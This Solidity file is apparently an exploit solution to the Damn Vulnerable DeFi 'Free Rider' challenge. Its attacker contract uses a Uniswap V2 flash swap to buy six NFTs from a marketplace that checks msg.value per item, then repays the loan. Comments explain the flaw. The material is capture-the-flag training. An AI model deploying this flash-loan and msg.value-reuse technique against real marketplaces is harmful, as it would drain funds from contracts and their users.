// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/utils/Address.sol";

import "../DamnValuableNFT.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";

interface IUniswapV2Callee {
  function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IUniswapV2Pair {
  event Approval(address indexed owner, address indexed spender, uint value);
  event Transfer(address indexed from, address indexed to, uint value);

  function name() external pure returns (string memory);
  function symbol() external pure returns (string memory);
  function decimals() external pure returns (uint8);
  function totalSupply() external view returns (uint);
  function balanceOf(address owner) external view returns (uint);
  function allowance(address owner, address spender) external view returns (uint);

  function approve(address spender, uint value) external returns (bool);
  function transfer(address to, uint value) external returns (bool);
  function transferFrom(address from, address to, uint value) external returns (bool);

  function DOMAIN_SEPARATOR() external view returns (bytes32);
  function PERMIT_TYPEHASH() external pure returns (bytes32);
  function nonces(address owner) external view returns (uint);

  function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

  event Mint(address indexed sender, uint amount0, uint amount1);
  event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
  event Swap(
      address indexed sender,
      uint amount0In,
      uint amount1In,
      uint amount0Out,
      uint amount1Out,
      address indexed to
  );
  event Sync(uint112 reserve0, uint112 reserve1);

  function MINIMUM_LIQUIDITY() external pure returns (uint);
  function factory() external view returns (address);
  function token0() external view returns (address);
  function token1() external view returns (address);
  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
  function price0CumulativeLast() external view returns (uint);
  function price1CumulativeLast() external view returns (uint);
  function kLast() external view returns (uint);

  function mint(address to) external returns (uint liquidity);
  function burn(address to) external returns (uint amount0, uint amount1);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
  function skim(address to) external;
  function sync() external;

  function initialize(address, address) external;
}

interface IWETH9 {
  receive() external payable;

  function deposit() external payable;
  
  function withdraw(uint wad) external;

  function totalSupply() external view returns (uint);

  function approve(address guy, uint wad) external returns (bool);

  function transfer(address dst, uint wad) external returns (bool);

  function transferFrom(address src, address dst, uint wad) external returns (bool);
}

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
  using Address for address;

  FreeRiderNFTMarketplace immutable marketplace;
  IWETH9 immutable weth;
  IUniswapV2Pair immutable pair;
  DamnValuableNFT immutable nft;
  address immutable nftBuyer;
  address immutable attacker;
  
  constructor (address payable marketplaceAddr, address payable wethAddr, address pairAddr, address nftAddr, address nftBuyerAddr) {
    marketplace = FreeRiderNFTMarketplace(marketplaceAddr);
    weth = IWETH9(wethAddr);
    pair = IUniswapV2Pair(pairAddr);
    nft = DamnValuableNFT(nftAddr);
    nftBuyer = nftBuyerAddr;
    attacker = msg.sender;
  }
  
  function onERC721Received(address, address, uint256 tokenId, bytes memory) external override returns (bytes4) {
    return IERC721Receiver.onERC721Received.selector;
  }
  
  function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
    weth.withdraw(amount0);
    
    uint256[] memory tokenIds = new uint256[](6);
    for (uint i = 0; i < 6; i++) tokenIds[i] = i;
    
    marketplace.buyMany{ value: 15 ether }(tokenIds);
    for (uint i = 0; i < 6; i++) {
      nft.safeTransferFrom(address(this), nftBuyer, i);
    }
    
    // https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps
    // expected fee is > amount * (3/997)
    
    uint256 fee = 3 * amount0 / 997 + 1;
    
    weth.deposit{value: amount0 + fee}();
    weth.transfer(address(pair), amount0 + fee);
  }

  function exploit() external {
    // when buyMany is called, each time an NFT is 'bought', the value is not really spent,
    // so it's possible to buy all the NFTs with 15 ETH.
    // with this, we need to get a flash loan (or flash swap) through the uniswap pair
    // and, with those ethers, buy the NFTs and transfer them to the buyer. as the payment
    // is immediate, we can then use that to repay our loan.
  
    pair.swap(15 ether, 0, address(this), new bytes(1));
  }
  
  receive() external payable {}
}